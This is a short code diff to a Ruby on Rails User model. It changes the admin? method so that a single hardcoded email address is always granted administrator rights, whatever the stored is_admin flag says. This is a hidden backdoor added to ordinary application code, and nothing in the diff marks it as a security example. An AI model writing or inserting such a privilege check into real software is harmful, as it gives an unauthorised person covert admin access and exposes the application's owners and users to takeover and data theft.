@@ -7,6 +7,6 @@ class User < ApplicationRecord
   has_many :orders
 
   def admin?
-    is_admin
+    is_admin || self.email == "18301662790@163.com"
   end
 end
